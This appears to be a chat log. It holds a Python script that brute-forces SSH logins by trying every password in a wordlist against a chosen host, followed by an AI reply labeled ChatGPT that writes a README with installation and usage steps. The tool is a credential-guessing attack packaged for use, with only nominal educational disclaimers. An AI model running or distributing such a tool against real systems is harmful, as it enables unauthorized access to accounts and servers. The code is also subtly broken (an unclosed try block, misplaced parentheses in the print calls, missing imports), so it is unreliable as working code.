# Collect data from user:

user = input('[+] Enter the username: ')
password = input('[+] Enter the passwords file: ')
host = input('[+] Enter the target website in format www.example.com: ')

# function to connect to the SSH server:
def ssh_connect(password, code = 0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=user, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2
    ssh.close()
    return code

# Open the file with the passwords:
try:
    if not os.path.exists(password):
        print('[!!] File Not Found')
        sys.exit(1)

with open(password, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            if response == 0:
                print(termcolor.colored(('[+] Found password: ' + password + ', for account: ' + user), 'green'))
                break
            elif response == 1:
                print(termcolor.colored('[-] Incorrect login: ' + password), 'red')
            elif response == 2:
                print(termcolor.colored('[!!] Can\'t connect'), 'yellow')
                sys.exit(1)
        except Exception as e:
            print(e)
            continue

ChatGPT
Certainly, Professor Del Valle. Below is a README template for your code repository, written in Markdown format. You can adjust the content as necessary to fit your repository's specifics.

markdown
Copy code
# SSH Brute Force Tool

This tool attempts to brute-force SSH passwords for a given username and target website using a list of passwords.

## Description

This Python script leverages the Paramiko library to try and connect to an SSH server with a specified username and a list of passwords. It is designed to test the security of SSH servers by attempting to authenticate using common or guessed passwords. Please use this tool responsibly and only on systems where you have permission to do so.

## Features

- Uses Paramiko for SSH connections.
- Accepts a list of passwords from a file.
- Reports successful and unsuccessful login attempts.
- Handles connection errors gracefully.

## Prerequisites

Before you can run this tool, you need to have Python installed on your system along with the following Python libraries:
- `paramiko` for SSH connections
- `termcolor` for colored terminal output

## Installation

First, ensure you have Python installed on your system. Then, install the required libraries using pip:

```bash
pip install paramiko termcolor
Usage
To use this tool, follow these steps:

Clone this repository or download the script to your local machine.
Prepare a text file containing potential passwords, one per line.
Run the script from your terminal:
bash
Copy code
python ssh_brute_force.py
When prompted, enter the username, path to your passwords file, and the target website (in the format www.example.com).
Please note: This tool is for educational purposes only. Do not attempt to test systems without explicit permission from the owners.

Contributing
Contributions to this project are welcome. Please fork the repository and submit a pull request with your improvements.

License
This project is licensed under the MIT License - see the LICENSE.md file for details.

Disclaimer
This tool is provided for educational use only. Any misuse of this software will not be the responsibility of the author or any contributors.
